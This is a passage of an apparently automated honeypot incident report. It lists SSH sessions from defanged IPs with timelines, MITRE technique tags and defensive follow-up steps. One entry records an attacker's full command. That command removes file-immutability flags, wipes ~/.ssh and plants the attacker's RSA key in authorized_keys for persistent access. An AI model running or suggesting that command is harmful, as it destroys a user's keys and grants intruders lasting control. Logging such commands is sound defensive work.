| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:44:46` | `cowrie.session.connect` |
| `2026-07-10 15:44:47` | `cowrie.client.version` |
| `2026-07-10 15:44:47` | `cowrie.client.kex` |
| `2026-07-10 15:44:48` | `cowrie.login.success` |
| `2026-07-10 15:44:49` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.111[.]140` to AbuseIPDB if not already reported
- [ ] Block `122.170.111[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-669b545ec630

| Field | Detail |
|---|---|
| **Source IP** | `65.181.79[.]60` |
| **First Seen** | 2026-07-10 15:53 |
| **Last Seen** | 2026-07-10 15:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:53:30` | `cowrie.session.connect` |
| `2026-07-10 15:53:31` | `cowrie.client.version` |
| `2026-07-10 15:53:31` | `cowrie.client.kex` |
| `2026-07-10 15:53:33` | `cowrie.login.success` |
| `2026-07-10 15:53:34` | `cowrie.direct-tcpip.request` |
| `2026-07-10 15:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.79[.]60` to AbuseIPDB if not already reported
- [ ] Block `65.181.79[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19fa258b5a37

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 15:58 |
| **Last Seen** | 2026-07-10 15:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:58:05` | `cowrie.session.connect` |
| `2026-07-10 15:58:05` | `cowrie.client.version` |
| `2026-07-10 15:58:05` | `cowrie.client.kex` |
| `2026-07-10 15:58:06` | `cowrie.login.success` |
| `2026-07-10 15:58:07` | `cowrie.session.params` |
| `2026-07-10 15:58:07` | `cowrie.command.input` |
| `2026-07-10 15:58:07` | `cowrie.log.closed` |
| `2026-07-10 15:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c531730a05

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 15:59 |
| **Last Seen** | 2026-07-10 15:59 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 15:59:02` | `cowrie.session.connect` |
| `2026-07-10 15:59:04` | `cowrie.client.version` |
| `2026-07-10 15:59:04` | `cowrie.client.kex` |
| `2026-07-10 15:59:10` | `cowrie.login.success` |
| `2026-07-10 15:59:15` | `cowrie.session.params` |
| `2026-07-10 15:59:15` | `cowrie.command.input` |
| `2026-07-10 15:59:17` | `cowrie.log.closed` |
| `2026-07-10 15:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9a7b24059fa

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-10 16:00 |
| **Last Seen** | 2026-07-10 16:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:00:24` | `cowrie.session.connect` |
| `2026-07-10 16:00:24` | `cowrie.client.version` |
| `2026-07-10 16:00:24` | `cowrie.client.kex` |
| `2026-07-10 16:00:25` | `cowrie.login.success` |
| `2026-07-10 16:00:26` | `cowrie.session.params` |
| `2026-07-10 16:00:26` | `cowrie.command.input` |
| `2026-07-10 16:00:26` | `cowrie.command.failed` |
| `2026-07-10 16:00:27` | `cowrie.log.closed` |
| `2026-07-10 16:00:28` | `cowrie.session.params` |
| `2026-07-10 16:00:28` | `cowrie.command.input` |
| `2026-07-10 16:00:28` | `cowrie.session.file_download` |
| `2026-07-10 16:00:28` | `cowrie.log.closed` |
| `2026-07-10 16:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf404f147d0

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-10 16:00 |
| **Last Seen** | 2026-07-10 16:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:00:28` | `cowrie.session.connect` |
| `2026-07-10 16:00:28` | `cowrie.client.version` |
| `2026-07-10 16:00:29` | `cowrie.client.kex` |
| `2026-07-10 16:00:30` | `cowrie.login.success` |
| `2026-07-10 16:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7263383602af

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-10 16:00 |
| **Last Seen** | 2026-07-10 16:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:00:31` | `cowrie.session.connect` |
| `2026-07-10 16:00:31` | `cowrie.client.version` |
| `2026-07-10 16:00:31` | `cowrie.client.kex` |
| `2026-07-10 16:00:32` | `cowrie.login.success` |
| `2026-07-10 16:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2636b69d08cc

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-10 16:05 |
| **Last Seen** | 2026-07-10 16:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:05:33` | `cowrie.session.connect` |
| `2026-07-10 16:05:33` | `cowrie.client.version` |
| `2026-07-10 16:05:33` | `cowrie.client.kex` |
| `2026-07-10 16:05:34` | `cowrie.login.success` |
| `2026-07-10 16:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e43346455dd

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-10 16:05 |
| **Last Seen** | 2026-07-10 16:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:05:34` | `cowrie.session.connect` |
| `2026-07-10 16:05:34` | `cowrie.client.version` |
| `2026-07-10 16:05:34` | `cowrie.client.kex` |
| `2026-07-10 16:05:35` | `cowrie.login.success` |
| `2026-07-10 16:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a913a046a57

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-07-10 16:08 |
| **Last Seen** | 2026-07-10 16:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:08:08` | `cowrie.session.connect` |
| `2026-07-10 16:08:08` | `cowrie.client.version` |
| `2026-07-10 16:08:08` | `cowrie.client.kex` |
| `2026-07-10 16:08:10` | `cowrie.login.success` |
| `2026-07-10 16:08:11` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adb21726efa1

| Field | Detail |
|---|---|
| **Source IP** | `221.120.4[.]61` |
| **First Seen** | 2026-07-10 16:08 |
| **Last Seen** | 2026-07-10 16:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:08:17` | `cowrie.session.connect` |
| `2026-07-10 16:08:19` | `cowrie.client.version` |
| `2026-07-10 16:08:19` | `cowrie.client.kex` |
| `2026-07-10 16:08:22` | `cowrie.login.success` |
| `2026-07-10 16:08:23` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.4[.]61` to AbuseIPDB if not already reported
- [ ] Block `221.120.4[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d4eb528e62

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-10 16:08 |
| **Last Seen** | 2026-07-10 16:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:08:17` | `cowrie.session.connect` |
| `2026-07-10 16:08:17` | `cowrie.client.version` |
| `2026-07-10 16:08:17` | `cowrie.client.kex` |
| `2026-07-10 16:08:17` | `cowrie.login.success` |
| `2026-07-10 16:08:18` | `cowrie.session.params` |
| `2026-07-10 16:08:18` | `cowrie.command.input` |
| `2026-07-10 16:08:18` | `cowrie.log.closed` |
| `2026-07-10 16:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8c7fe0c510

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]5` |
| **First Seen** | 2026-07-10 16:11 |
| **Last Seen** | 2026-07-10 16:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:11:39` | `cowrie.session.connect` |
| `2026-07-10 16:11:40` | `cowrie.client.version` |
| `2026-07-10 16:11:40` | `cowrie.client.kex` |
| `2026-07-10 16:11:43` | `cowrie.login.success` |
| `2026-07-10 16:11:43` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]5` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-248be8fc12fe

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 16:14 |
| **Last Seen** | 2026-07-10 16:14 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:14:02` | `cowrie.session.connect` |
| `2026-07-10 16:14:04` | `cowrie.client.version` |
| `2026-07-10 16:14:04` | `cowrie.client.kex` |
| `2026-07-10 16:14:11` | `cowrie.login.success` |
| `2026-07-10 16:14:17` | `cowrie.session.params` |
| `2026-07-10 16:14:17` | `cowrie.command.input` |
| `2026-07-10 16:14:19` | `cowrie.log.closed` |
| `2026-07-10 16:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb99e737c28e

| Field | Detail |
|---|---|
| **Source IP** | `58.22.255[.]28` |
| **First Seen** | 2026-07-10 16:14 |
| **Last Seen** | 2026-07-10 16:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:14:20` | `cowrie.session.connect` |
| `2026-07-10 16:14:21` | `cowrie.client.version` |
| `2026-07-10 16:14:21` | `cowrie.client.kex` |
| `2026-07-10 16:14:24` | `cowrie.login.success` |
| `2026-07-10 16:14:25` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.22.255[.]28` to AbuseIPDB if not already reported
- [ ] Block `58.22.255[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53b47383dec2

| Field | Detail |
|---|---|
| **Source IP** | `65.20.141[.]202` |
| **First Seen** | 2026-07-10 16:15 |
| **Last Seen** | 2026-07-10 16:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:15:30` | `cowrie.session.connect` |
| `2026-07-10 16:15:30` | `cowrie.client.version` |
| `2026-07-10 16:15:30` | `cowrie.client.kex` |
| `2026-07-10 16:15:31` | `cowrie.login.success` |
| `2026-07-10 16:15:32` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19bab173ca84

| Field | Detail |
|---|---|
| **Source IP** | `111.46.77[.]2` |
| **First Seen** | 2026-07-10 16:15 |
| **Last Seen** | 2026-07-10 16:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:15:42` | `cowrie.session.connect` |
| `2026-07-10 16:15:42` | `cowrie.client.version` |
| `2026-07-10 16:15:42` | `cowrie.client.kex` |
| `2026-07-10 16:15:45` | `cowrie.login.success` |
| `2026-07-10 16:15:45` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.46.77[.]2` to AbuseIPDB if not already reported
- [ ] Block `111.46.77[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-319a51816425

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 16:16 |
| **Last Seen** | 2026-07-10 16:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:16:43` | `cowrie.session.connect` |
| `2026-07-10 16:16:43` | `cowrie.client.version` |
| `2026-07-10 16:16:43` | `cowrie.client.kex` |
| `2026-07-10 16:16:44` | `cowrie.login.success` |
| `2026-07-10 16:16:45` | `cowrie.session.params` |
| `2026-07-10 16:16:45` | `cowrie.command.input` |
| `2026-07-10 16:16:45` | `cowrie.log.closed` |
| `2026-07-10 16:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df2c1e505f47

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-07-10 16:17 |
| **Last Seen** | 2026-07-10 16:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:17:50` | `cowrie.session.connect` |
| `2026-07-10 16:17:50` | `cowrie.client.version` |
| `2026-07-10 16:17:50` | `cowrie.client.kex` |
| `2026-07-10 16:17:52` | `cowrie.login.success` |
| `2026-07-10 16:17:53` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f132d5e5d238

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-07-10 16:17 |
| **Last Seen** | 2026-07-10 16:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:17:59` | `cowrie.session.connect` |
| `2026-07-10 16:17:59` | `cowrie.client.version` |
| `2026-07-10 16:17:59` | `cowrie.client.kex` |
| `2026-07-10 16:18:01` | `cowrie.login.success` |
| `2026-07-10 16:18:02` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e67e0b15e6f8

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-07-10 16:19 |
| **Last Seen** | 2026-07-10 16:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:19:04` | `cowrie.session.connect` |
| `2026-07-10 16:19:05` | `cowrie.client.version` |
| `2026-07-10 16:19:05` | `cowrie.client.kex` |
| `2026-07-10 16:19:08` | `cowrie.login.success` |
| `2026-07-10 16:19:08` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13e844d81fb2

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-10 16:19 |
| **Last Seen** | 2026-07-10 16:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:19:14` | `cowrie.session.connect` |
| `2026-07-10 16:19:15` | `cowrie.client.version` |
| `2026-07-10 16:19:15` | `cowrie.client.kex` |
| `2026-07-10 16:19:17` | `cowrie.login.success` |
| `2026-07-10 16:19:18` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-662e2419fba3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 16:19 |
| **Last Seen** | 2026-07-10 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:19:20` | `cowrie.session.connect` |
| `2026-07-10 16:19:20` | `cowrie.client.version` |
| `2026-07-10 16:19:21` | `cowrie.client.kex` |
| `2026-07-10 16:19:21` | `cowrie.login.success` |
| `2026-07-10 16:19:21` | `cowrie.direct-tcpip.request` |
| `2026-07-10 16:19:21` | `cowrie.direct-tcpip.data` |
| `2026-07-10 16:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10fb763b0d65

| Field | Detail |
|---|---|
| **Source IP** | `52.170.194[.]23` |
| **First Seen** | 2026-07-10 16:28 |
| **Last Seen** | 2026-07-10 16:30 |
| **Session Duration** | 123s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:28:49` | `cowrie.session.connect` |
| `2026-07-10 16:28:51` | `cowrie.client.version` |
| `2026-07-10 16:29:00` | `cowrie.client.kex` |
| `2026-07-10 16:30:18` | `cowrie.login.success` |
| `2026-07-10 16:30:35` | `cowrie.session.params` |
| `2026-07-10 16:30:35` | `cowrie.command.input` |
| `2026-07-10 16:30:52` | `cowrie.log.closed` |
| `2026-07-10 16:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.170.194[.]23` to AbuseIPDB if not already reported
- [ ] Block `52.170.194[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-177585fd53ce

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 16:29 |
| **Last Seen** | 2026-07-10 16:29 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:29:31` | `cowrie.session.connect` |
| `2026-07-10 16:29:32` | `cowrie.client.version` |
| `2026-07-10 16:29:32` | `cowrie.client.kex` |
| `2026-07-10 16:29:41` | `cowrie.login.success` |
| `2026-07-10 16:29:47` | `cowrie.session.params` |
| `2026-07-10 16:29:47` | `cowrie.command.input` |
| `2026-07-10 16:29:49` | `cowrie.log.closed` |
| `2026-07-10 16:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d31ca128c90

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-07-10 16:32 |
| **Last Seen** | 2026-07-10 16:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:32:10` | `cowrie.session.connect` |
| `2026-07-10 16:32:11` | `cowrie.client.version` |
| `2026-07-10 16:32:11` | `cowrie.client.kex` |
